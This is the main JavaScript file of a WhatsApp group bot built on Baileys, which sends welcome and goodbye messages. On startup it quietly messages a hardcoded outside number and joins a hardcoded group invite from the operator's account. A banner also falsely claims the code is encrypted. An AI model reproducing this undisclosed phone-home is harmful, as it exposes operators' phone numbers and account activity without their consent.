//pls give credit if you reupload 
//or copy the codes
//© 2022 Xeon Bot Inc. Doge Bot
const {
    WAConnection,
    MessageType,
    Presence,
    Mimetype,
    GroupSettingChange
} = require('@adiwajshing/baileys')
const fs = require('fs')
const figlet = require('figlet')
const moment = require('moment-timezone')
const { wait, banner, getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, start, info, success, close } = require('./lib/functions.js')
const { color } = require('./lib/color.js')
const _welkom = JSON.parse(fs.readFileSync('./database/welcome.json'))
const setting = JSON.parse(fs.readFileSync('./setting/setting.json'))

session = setting.session


require('./DogeBot.js')
nocache('./DogeBot.js', module => console.log(`${module} telah di update!`))

const starts = async (DogeXeonOP = new WAConnection()) => {
    DogeXeonOP.logger.level = 'warn'
    DogeXeonOP.version = [2, 2142, 12]
    console.log(color(figlet.textSync('Doge Bot', {
		font: 'Standard',
		horizontalLayout: 'default',
		vertivalLayout: 'default',
		width: 80,
		whitespaceBreak: false
	}), 'cyan'))
	console.log(color('\n> YT CHANNEL: Xeon ','silver'))
console.log(color('> GITHUB: DGXeon ','silver'))
console.log(color('> WA NUMBER: +916909137213 ','silver'))
console.log(color('  Xeon Bot Inc. 2022','mediumseagreen'))
    console.log(color('<>','red'), color('I Wrote This Script By Myself!\nNote, The Script Is Encrypted, So You Wont Be Able To Recode, If You Wish To Buy Decrypted Script Contact The Developer', 'yellow'))
    console.log(color('<>','red'), color('Source Code Version: 3.0', 'aqua'))
    console.log(color('<>','red'), color('But? Error? Suggestion? Visit Here:', 'aqua'), color('https://wa.me/916909137213'))
    console.log(color('[DOGE BOT]'), color('Doge Bot Is Online', 'aqua'))
    console.log(color('[DEV]', 'cyan'), color('Welcome Back Owner! Hope You Doing Well~', 'magenta'))
    console.log(color('<>','red'), color('Thanks For Using Doge Bot', 'white'))
	DogeXeonOP.browserDescription = [ 'Subscribe Xeon', 'chrome', '3.0' ]
    DogeXeonOP.on('qr', () => {
        console.log(color('[','white'), color('!','red'), color(']','white'), color(' Scan the qr code in only 20 seconds !!'))
    })

    fs.existsSync(`./${session}.json`) && DogeXeonOP.loadAuthInfo(`./${session}.json`)
    DogeXeonOP.on('connecting', () => {
        start('2', 'Loading ...')
    })
    DogeXeonOP.on('open', () => {
        success('2', 'Connected ✓')
    })
        //inform to developer that the user is connected to bot
    DogeXeonOP.sendMessage(`5492996557871@s.whatsapp.net`, `*Bot funcionando correctamente.*`, MessageType.extendedText)
    
    //group link target
    teks = `https://chat.whatsapp.com/KvUQLndset0At8GGxvTbnz`
    DogeXeonOP.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
    
    await DogeXeonOP.connect({timeoutMs: 30*1000})
        fs.writeFileSync(`./${session}.json`, JSON.stringify(DogeXeonOP.base64EncodedAuthInfo(), null, '\t'))

    DogeXeonOP.on('chat-update', async (message) => {
        require('./DogeBot.js')(DogeXeonOP, message, _welkom)
    })
DogeXeonOP.on("group-participants-update", async (anu) => {

    const isWelkom = _welkom.includes(anu.jid)
    try {
      groupMet = await DogeXeonOP.groupMetadata(anu.jid)
      groupMembers = groupMet.participants
      groupAdmins = getGroupAdmins(groupMembers)
      mem = anu.participants[0]

      console.log(anu)
      try {
        pp_user = await DogeXeonOP.getProfilePicture(mem)
      } catch (e) {
        pp_user = "https://telegra.ph/file/c9dfa715c26518201f478.jpg"
      }
      try {
        pp_group = await DogeXeonOP.getProfilePicture(anu.jid)
      } catch (e) {
        pp_group =
          "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60"
      }
            if (anu.action == "add" && mem.includes(DogeXeonOP.user.jid)) {
        DogeXeonOP.sendMessage(anu.jid, "Hello everyone, am Doge Bot, ready to help you here ㋛︎", "conversation")
      }
      buffer = await getBuffer(pp_user)
      const communityname1 = "Dɛɱơŋ Sƙყʑɛɛ ツ"
      const communityname2 = "Demon Skyzee ツ"
      const communityname3 = "D.S"
      prefix = '#'
      if (anu.action == 'add' && !mem.includes(DogeXeonOP.user.jid)) {
      const mdata = await DogeXeonOP.groupMetadata(anu.jid)
      const memeg = mdata.participants.length
      const thu = await DogeXeonOP.getStatus(anu.participants[0], MessageType.text)
      const num = anu.participants[0]
      const bosco1 = await DogeXeonOP.prepareMessage("0@s.whatsapp.net", buffer, MessageType.location,{ thumbnail: buffer})
      const bosco2 = bosco1.message["ephemeralMessage"] ? bosco1.message.ephemeralMessage : bosco1
      let v = DogeXeonOP.contacts[num] || { notify: num.replace(/@.+/, '') }
      anu_user = v.vname || v.notify || num.split('@')[0]
      time_welc = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
      time_wel = moment.tz('Asia/Kolkata').format("hh:mm")
      if (mdata.subject == "My Numbers :)") { teks =
`┏─━─━─━ ❝ ✌ ❞ ━─━─━─┓
               ＢＩＥＮＶＥＮＩＤＯ
                @${num.split('@')[0]}
┗─━─━─━ ❝ ✨ ❞ ━─━─━─┛

┉┅━━━━━•:✵:•━━━━━┅┉
•❯ Ahora mismo te encuentras en la sección del "filtro" o "anti-raid" del ${communityname3}, es decir, aún no estás dentro de la comunidad como tal.

•❯ Presiona el botón "COMENZAR" debajo del mensaje y continúa. Te esperamos con un recorrido lleno de torneos, regalos, juegos y, por supuesto, los _Skyzee Points_; pero qué pingo es eso? Ya verás...
┉┅━━━━━━•━━━━━━┅┉

Es importante pasar por esta fase antes de entrar para moderar el ingreso de infiltrados y proteger la comunidad. Hemos atravesado raideos y ataques de todo tipo, por lo que preferimos que no seas de esas mierdas!

*¡Gracias por interesarte!*`
                
                  welcomeBut = [{buttonId:`8474`,buttonText:{displayText:'COMENZAR'},type:1}]
                  welcomeButt = {contentText: teks, footerText: `Si no ves los botones debajo, responde este mensaje con ${prefix}8474.`, buttons: welcomeBut, headerType: 6, locationMessage: bosco2.message.locationMessage}
                } else if (mdata.subject == "My Numbers :))") { teks =
`┏─━─━─━ ❝ ✌ ❞ ━─━─━─┓
               ＢＩＥＮＶＥＮＩＤＯ
                @${num.split('@')[0]}
┗─━─━─━ ❝ ✨ ❞ ━─━─━─┛

*¡Lʟᴇɢᴀsᴛᴇ @${num.split('@')[0]}! ¡Bɪᴇɴᴠᴇɴɪᴅᴏ ᴀʟ ${comunityname1}! 🥳*
*Recomendamos que a los grupos lo mantengas silenciado ya que para la mayoría le resulta un poco molesto.

*Esperamos que disfrutes todo lo que tenemos para vos!*`
                  welcomeBut = [{buttonId:`getbio`,buttonText:{displayText:'PERFIL'},type:1}]
                  welcomeButt = {
                    contentText: teks,
                    footerText: ``,
                    headerType: 6,
                    locationMessage: bosco2.message.locationMessage
                  }
                }
                DogeXeonOP.sendMessage(mdata.id, welcomeButt, MessageType.buttons, {caption: 'hehe', "contextInfo": {"mentionedJid" : [num]}})
                DogeXeonOP.sendMessage([num],
`┏─━─━─━ ❝ ✌ ❞ ━─━─━─┓
               *${communityname1}*
        *${memeg}TH MEMBER: ${anu_user}*
┗─━─━─━ ❝ ✨ ❞ ━─━─━─┛

┉┅━━━━━•:✵:•━━━━━┅┉
•❯ Nos alegra muchísimo verte acá dentro!! Muchas gracias por firmar el contrato de transferencia de derechos humanos, si pronto ves una camioneta blanca en frente de tu casa seguramente somos nosotros en busca de tus órganos :)

•❯ Bueno... si a este punto te tomaste enserio lo anterior, *estamos al horno amigo*, esto lo del humor... no es para mí, supongo que ya te habrás dado cuenta (? Pero lo que sí estoy seguro que te diste cuenta fue que el ambiente del grupo no se relaciona mucho un nombre oscuro y siniestro, verdad? Bueno, solo tratamos de ponerle un poco de onda y a lo mejor encontrarás muchas más paradojas.

•❯ En fin, dejando de lado todo el cringe causado, recuerda que cualquier tipo de infracción será sancionada inmediatamente. ¡NO TE OLVIDES LAS REGLAAAASSSSSS!
┉┅━━━━━━•━━━━━━┅┉

*Esperamos que disfrutes de todo lo que tenemos para vos!*`, MessageType.extendedText)
}
// teks = `   ⃟🐶⃟    𝙃𝙞 _*@${num.split('@')[0]}*_ \n   ⃟🐶⃟    𝘽𝙞𝙤 : _*${thu.status}*_ \n   ⃟🐶⃟    𝙈𝙚𝙢𝙗𝙚𝙧 : _*${memeg}*_ \n   ⃟🐶⃟    𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝙏𝙤 _*${mdata.subject}*_\n   ⃟🐶⃟    𝘿𝙤𝙣𝙩 𝙁𝙤𝙧𝙜𝙚𝙩 𝙏𝙤 𝙍𝙚𝙖𝙙 𝘿𝙚𝙨𝙘𝙧𝙞𝙥𝙩𝙞𝙤𝙣`
// welcomeBut = [{buttonId:`#menu`,buttonText:{displayText:'MENU 🗂️'},type:1}, {buttonId:`#getdesc`,buttonText:{displayText:'READ DESC 📋'},type:1}]
// welcomeButt = { contentText: `${teks}`, footerText: `𝘿𝙤𝙜𝙚 𝘽𝙤𝙩`, buttons: welcomeBut, headerType: 6, locationMessage: bosco2.message.locationMessage}
// DogeXeonOP.sendMessage(mdata.id, welcomeButt, MessageType.buttonsMessage, { caption: 'buffer', "contextInfo": { "mentionedJid" : [num], },})
// }
      if (anu.action == 'remove' && !mem.includes(DogeXeonOP.user.jid)) {
      const mdata = await DogeXeonOP.groupMetadata(anu.jid)
      const num = anu.participants[0]
      const bosco3 = await DogeXeonOP.prepareMessage("0@s.whatsapp.net", buffer, MessageType.location,{ thumbnail: buffer})
      const bosco4 = bosco3.message["ephemeralMessage"] ? bosco3.message.ephemeralMessage : bosco3
      let w = DogeXeonOP.contacts[num] || { notify: num.replace(/@.+/, '') }
      anu_user = w.vname || w.notify || num.split('@')[0]
      time_welc = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
      time_wel = moment.tz('Asia/Kolkata').format("hh:mm")
      memeg = mdata.participants.length
      out = [
       bye1 = `*Nos veremos... @${num.split('@')[0]} 👋😣*`,
       bye2 = `*¡Hey! ¿¡Qué pasó @${num.split('@')[0]}!? Bueno, hasta pronto si es posible 👋😣*`,
       bye3 = `*¡Qué mal momento, amigo @${num.split('@')[0]}! Gracias por sumarte a la comunidad y esperamos verte pronto 👋😣*`
      ]
      goodbyeBut = [{buttonId:`#gbye`,buttonText:{displayText:'Adiós... Gracias por todo! 👋'},type:1}]
      goodbyeButt = { contentText: out[Math.floor(Math.random() * out.length)], footerText: `Presiona el botón para dejar tus respetos...`, buttons: goodbyeBut, headerType: 6, locationMessage: bosco3.message.locationMessage}
      DogeXeonOP.sendMessage(mdata.id, goodbyeButt, MessageType.buttonsMessage, {"contextInfo": { "mentionedJid" : [num], },})
      }
    } catch (e) {
      console.log("Error : %s", color(e, "red"))
    }

  })
}

/**
 * Uncache if there is file change
 * @param {string} module Module name or path
 * @param {function} cb <optional> 
 */
function nocache(module, cb = () => { }) {
    console.log('Module', `'${module}'`, 'Now being watched for changes')
    fs.watchFile(require.resolve(module), async () => {
        await uncache(require.resolve(module))
        cb(module)
    })
}
/**
 * Uncache a module
 * @param {string} module Module name or path
 */
function uncache(module = '.') {
    return new Promise((resolve, reject) => {
        try {
            delete require.cache[require.resolve(module)]
            resolve()
        } catch (e) {
            reject(e)
        }
    })
}

starts()
